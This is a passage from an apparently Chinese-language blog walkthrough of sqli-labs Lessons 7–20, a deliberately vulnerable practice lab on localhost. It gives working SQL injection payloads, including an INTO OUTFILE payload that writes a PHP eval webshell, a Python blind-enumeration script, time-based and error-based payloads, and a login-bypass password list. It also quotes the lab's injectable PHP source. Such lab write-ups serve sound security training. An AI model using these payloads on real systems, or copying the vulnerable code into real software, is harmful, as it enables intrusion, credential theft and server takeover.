&#x27;&quot;&#x27;.$id.&#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); Lesson 7Dump into outfile - String （导出文件GET字符型注入）id=1先看一下：提示用outfile，outfile是mysql中导出数据到文本文件中的语句，如： 1SELECT * FROM passwd INTO OUTFILE &#x27;/password.txt&#x27; 这样会在当前目录下创建一个文件，这里要注意，在SQL注入中利用Outfile，这里的路径只能是网站的绝对路径回到题目，测试后发现能够闭合的payload如下： 1http://127.0.0.1/Less-7/?id=1&#x27; )) --+ 尝试写入一句话木马： 1http://127.0.0.1/Less-7/?id=1&#x27; )) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;&#x27; into outfile &#x27;/var/www/html/bk.php&#x27; --+ 需要注意的是，由于我的环境是docker，刚开始使用上面的payload写入文件时发现写不进去，查阅资料后发现是缺少权限，就手动给网站目录加了可写权限虽然还是这个界面但是在网站目录下已经看到了写入的木马文件蚁剑连接： Lesson 8GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)布尔型的单引号盲注，爆表方法与Lesson5一样，程序改一下可以直接使用 1234567891011121314151617181920212223242526272829303132333435from turtle import htimport requestsfrom lxml import etreeURL = &quot;http://127.0.0.1/Less-8/&quot;# 获取数据库名长度def db_len(): for i in range(1,10): payload = &quot;?id=1&#x27; and length(database())=&#123;0&#125;--+&quot;.format(i) r = requests.get(URL + payload) # 这里改了判断内容长度 if(r.headers[&#x27;Content-Length&#x27;])!=&#x27;442&#x27;: return int(i)# 获取数据库名def db_name(length): name = &quot;&quot; for i in range(1,length+1): for j in range(0,26): char = chr(97+j) payload = &quot;?id=1&#x27; and substring(database(),&#123;0&#125;,1)\\ =&#x27;&#123;1&#125;&#x27;--+&quot;.format(i,char) r = requests.get(URL + payload) # 这里也改了 if(r.headers[&#x27;Content-Length&#x27;])!=&#x27;442&#x27;: name += char continue return namedef main(): print(db_name(db_len()))main() 其余的也与Lesson-5相同，不再赘述但由于错误不会返回任何信息，Lesson5中用到的xmlupdate()的思路也不能用 Lesson 9GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)这里无论输入是否合法都只会显示下面的页面：但是并没有ban掉sleep函数，结合题目，是基于时间的盲注，构造如下的payload： 1http://127.0.0.1/Less-9/?id=1&#x27; and if(length(database())=8,sleep(5),1) --+ 当语句正确时延迟五秒：可以看到网页加载的时间，与语句不正确时有明显的的区别： 1http://127.0.0.1/Less-9/?id=1&#x27; and if(length(database())=1,sleep(5),1) --+ 我们可以基于此来猜测库名表名数据等等库名： 1http://127.0.0.1/Less-9/?id=1&#x27; and if(substr(database(),1,1)=&#x27;s&#x27;,sleep(5),1) --+ 表名： 12345//第一个表名http://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select table_name from information_schema.tables where table_schema = &#x27;security&#x27; limit 0，1),1,1)=&#x27;e&#x27;,sleep(5),1) --+//第二个表名http://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select table_name from information_schema.tables where table_schema = &#x27;security&#x27; limit 0，1),1,1)=&#x27;r&#x27;,sleep(5),1) --+ 列名： 12345//第一个列名http://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 0,1),1,1)=&#x27;i&#x27;,sleep(5),1) --+//第二个列名http://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 1,1),1,1)=&#x27;u&#x27;,sleep(5),1) --+ 数据： 12345//usernamehttp://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select username from users limit 0,1),1,1)=&#x27;D&#x27;,sleep(5),1) --+//passwordhttp://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select password from users limit 0,1),1,1)=&#x27;D&#x27;,sleep(5),1) --+ Lesson 10GET - Blind - Time based - double quotes (基于时间的双引号盲注)与Lesson9的唯一区别是闭合方式从单引号改为双引号，其余都一样，稍微修改一下payload就好 Lesson 11POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)打开题目，映入眼帘的是一个提交框是一道基于POST方法的题目，结合题目，单引号报错型，ok，那第一步要先抓个包看一下提交的参数名是什么，如下：接着在浏览器hackbar插件里面用POST方法提交就好了：构造payload： 1uname=admin&#x27; and 1=1 --+&amp;passwd=whatever 这里是POST提交的数据，先用单引号将uname=admin闭合，然后和一个恒真语句相与，并将后面的passwd字段注释掉，这样服务器收到的并执行的语句就是这样： 1@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;admin&#x27; and 1=1 --+&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;; 直接登录成功：这也是一些后台万能密码的原理，其他的一些万能密码如下： admin&#39; -- admin&#39; # admin&#39;/* &#39; or 1=1-- &#39; or 1=1# &#39; or 1=1/* &#39;) or &#39;1&#39;=&#39;1-- &#39;) or (&#39;1&#39;=&#39;1--登录进来后，查一下列数：1uname=admin&#x27; order by 3 --+&amp;passwd=whatever 到3时报错暴库，这里找了个不存在的账号，否则不会显示union select出的内容：1uname=1&#x27; union select 1,database() --+&amp;passwd=whatever 爆表：1uname=1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27; --+&amp;passwd=whatever 爆字段：1uname=1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name= &#x27;users&#x27; --+&amp;passwd=whatever 爆用户名：1uname=1&#x27; union select 1,username from security.users limit 0,1 --+&amp;passwd=whatever 递增limit 0,1第一个参数的值枚举数据同理爆密码：1uname=1&#x27; union select 1,password from security.users limit 2,1 --+&amp;passwd=whatever 源码1234567891011121314151617if(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123; $uname=$_POST[&#x27;uname&#x27;]; $passwd=$_POST[&#x27;passwd&#x27;]; //logging the connection parameters to a file for analysis. $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;); fwrite($fp,&#x27;User Name:&#x27;.$uname); fwrite($fp,&#x27;Password:&#x27;.$passwd.&quot;\\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27;\\ and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); Lesson 12POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)加个双引号先尝试一下： 1uname=admin&quot; &amp;passwd=whatever 报错，发现还要闭合一个括号：加个括号： 1uname=admin&quot;) --+ &amp;passwd=whatever 登录成功，其余同Lesson11，不再赘述 源码1234567// connectivity$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; @$sql=&quot;SELECT username, password FROM users WHERE username=\\(&quot;$uname&quot;) and password=($passwd) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); Lesson 13POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)尝试一下单引号： 1uname=admin&#x27; &amp;passwd=whatever 报错：发现还需要闭合一个单引号： 1uname=admin&#x27;) --+&amp;passwd=whatever 显示登录成功，但没有显示具体的信息，推测是盲注，测试一下 1uname=admin&#x27;) and if(length(database())=1,1,0)--+&amp;passwd=whatever 1uname=admin&#x27;) and if(length(database())=8,1,0)--+&amp;passwd=whatever 嗯，果然是，但是此处受Lesson5的启发，尝试一下基于xmlupdate()的报错注入： 1uname=admin&#x27;) and updatexml(1,concat(0x7e,database(),0x7e),1)--+&amp;passwd=whatever 成功：剩下的就和Lesson 5一样了，不再赘述 源码//注意源码注释了显示用户名和密码信息的代码 12345678910111213141516171819202122232425@$sql=&quot;SELECT username, password FROM users WHERE username=(&#x27;$uname&#x27;)\\ and password=(&#x27;$passwd&#x27;) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; //echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;; //echo &quot; You Have successfully logged in &quot; ; echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; //echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; //echo &quot;&lt;br&gt;&quot;; //echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; //echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125; Lesson 14POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)尝试了一下单引号发现没用，双引号闭合登录成功： 1uname=admin&quot; --+&amp;passwd=whatever 但是没有显示信息，只能用盲注： 1uname=admin&quot; and if(length(database())=1,1,0) --+&amp;passwd=whatever 其余与Lesson 13一样，再试一下xmlupdate报错注入： 1uname=admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)--+&amp;passwd=whatever 成功，其余与Lesson13同 源码123456$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; @$sql=&quot;SELECT username, password FROM users WHERE username=\\$uname and password=$passwd LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); Lesson 15POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)加单引号尝试一下： 1uname=admin&#x27; --+&amp;passwd=whatever 登录成功：尝试报错注入后，发现没有任何回显，直接bool盲注，根据是否登录成功来判断条件是否正确： 1uname=admin&#x27; and if(length(database())=1,1,0) --+&amp;passwd=whatever 1uname=admin&#x27; and if(length(database())=8,1,0) --+&amp;passwd=whatever 基于此修改Lesson 5的枚举脚本就即可得到数据 源码1234567891011121314151617181920212223242526@$sql=&quot;SELECT username, password FROM users WHERE username\\=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; //echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;; //echo &quot; You Have successfully logged in\\n\\n &quot; ; echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; //echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; //echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125; Lesson 16POST - Blind- Boolian/Time Based - Double quotes (基于bool型/时间延迟的双引号POST型盲注)除了闭合方式从&#39;闭合变为&quot;)闭合外，与Lesson15一样 1uname=admin&quot;) and if(length(database())=8,1,0) --+&amp;passwd=whatever 源码123456$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; @$sql=&quot;SELECT username, password FROM users WHERE username\\=($uname) and password=($passwd) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); Lesson 17POST - Update Query- Error Based - String (基于错误的更新查询POST注入)打开题目，发现是密码重置的界面尝试重置一下admin的密码： 1uname=admin&amp;passwd=123 成功重置了admin的密码看一下源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125;// take the variablesif(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123;//making sure uname is not injectable$uname=check_input($_POST[&#x27;uname&#x27;]); $passwd=$_POST[&#x27;passwd&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;User Name:&#x27;.$uname.&quot;\\n&quot;);fwrite($fp,&#x27;New Password:&#x27;.$passwd.&quot;\\n&quot;);fclose($fp);// connectivity @$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; //echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;; $row1 = $row[&#x27;username&#x27;]; //echo &#x27;Your Login name:&#x27;. $row1; $update=&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;; mysql_query($update); echo &quot;&lt;br&gt;&quot;; 发现使用check_input函数对uname做了过滤：首先做了截断，将字符限制在15个以内，然后先判断phpmagic_quotes_gpc环境变量是否打开，取出转义的\\，最后，如果uname不是数字，则将其字符进行转义，是数字将其转为数字类型。 mysql_real_escape_string()函数：get_magic_quotes_gpc()函数取得PHP环境配置的变量magic_quotes_gpc(GPC, Get/Post/Cookie)值。返回0表示本功能关闭，返回1表示本功能打开。当magic_quotes_gpc打开时，所有的&#39;(单引号)、&quot;(双引号)、\\(反斜杠)和NULL(空字符)会自动转为含有反斜杠的溢出字符。（参考：https://www.jianshu.com/p/62d394c38230 ） addslashes()与stripslashes()函数：addslashes(string)函数返回在预定义字符之前添加反斜杠\\的字符串，stripslashes(string)函数删除由addslashes()函数添加的反斜杠。可见，想用uname进行注入十分困难，但passwd参数就比较容易，因为在源码的倒数第三行passwd参数被用来更新密码，这里的passwd没有经过任何过滤，构造payload：1uname=admin&amp;passwd=&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)--+ 这里用的还是基于xmlupdate()函数的报错注入，可以看到直接返回了数据库名：其余的部分与Lesson 5类似，不再赘述Lesson 18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)随便输入看下回显，发现直接显示了我的ip地址和User-Agent头信息：再结合题目标题，应该是HTTP头注入，这里直接获取了我请求包中的信息显示了出来，看下源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0); function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,20); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; $uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;]; $IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your IP ADDRESS is: &#x27; .$IP; echo &quot;&lt;br&gt;&quot;; //echo &#x27;Your User Agent is: &#x27; .$uagent;// take the variablesif(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;])) &#123; $uname = check_input($_POST[&#x27;uname&#x27;]); $passwd = check_input($_POST[&#x27;passwd&#x27;]); /* echo &#x27;Your Your User name:&#x27;. $uname; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your Password:&#x27;. $passwd; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your User Agent String:&#x27;. $uagent; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your User Agent String:&#x27;. $IP; */ //logging the connection parameters to a file for analysis. $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;); fwrite($fp,&#x27;User Agent:&#x27;.$uname.&quot;\\n&quot;); fclose($fp); $sql=&quot;SELECT users.username, users.password FROM users WHERE\\ users.username=$uname and users.password=$passwd ORDER BY \\ users.id DESC LIMIT 0,1&quot;; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); if($row1) &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;; $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`,\\ `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;; mysql_query($insert); //echo &#x27;Your IP ADDRESS is: &#x27; .$IP; echo &quot;&lt;/font&gt;&quot;; //echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;; echo &#x27;Your User Agent is: &#x27; .$uagent; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; &#125; else &#123; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125; &#125;?&gt; 可以看到这里对输入的uname和passwd参数用check_input()做了严格的过滤，不太能注入，然而它直接将Http头中的user agent不加过滤的作为INSERT INTO语句的值，这就为我们注入提供了可能：我们可以burp抓包送到repeater模块，修改请求头的User-Agent字段，如下：构造上图中的包，可以看到回显如下：这里依旧用Lesson 5中提到的xmlupdate报错注入，构造如下的User-Agent头：可以在回显中看到xmlupdate的报错：剩下的就和Lesson 5相同了，不再赘述 Lesson 19打开实例，输入账号密码看一下回显：发现返回了HTTP头中referer字段的值，关于referer字段的作用，我在下面记录一下：referer字段用来提供访问来源的信息，当用户在地址栏输入网址或从标签页打开网址时，就不会发送referer字段，而在下面三种场景中会发送： 用户单击网页链接 用户发送表单 网页加载静态资源，如图片、脚本、样式在这三种场景下，浏览器会将当前网址作为referer字段放在请求头里并发送。回到题目，首先burp抓包送到repeater：可以看到这里的referer字段就是Lesson19网页的URL，尝试修改一下：报错：根据报错构造如下payload，依旧使用基于xmlupdate()的报错注入：其余同Lesson 18，不再赘述Lesson 20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)登录后显示如下界面：实际上这里显示的逻辑是：登录成功后前端又带着cookie使用基于GET方法请求了index页面，这一点从抓到的包可以看出来：这里是提交后POST包和它的响应包，可以看到这里的状态码是302，直接将页面重定向到了index.php，实际上这个返回页面看起来是这样的：只是快速重定向到了index.php，重定向发送了一个GET包，内容如下：可以看到其中包含了cookie信息，尝试注入：爆出错误信息：构造payload：爆出数据库名剩下的就和Lesson 5一样了，不再赘述 源码1234567$sql=&quot;SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1&quot;; $result=mysql_query($sql); if (!$result) &#123; die(&#x27;Issue with your mysql: &#x27; . mysql_error()); &#125; $row = mysql_fetch_array($result);","categories":[],"tags":[]}],"categories":[],"tags":[]}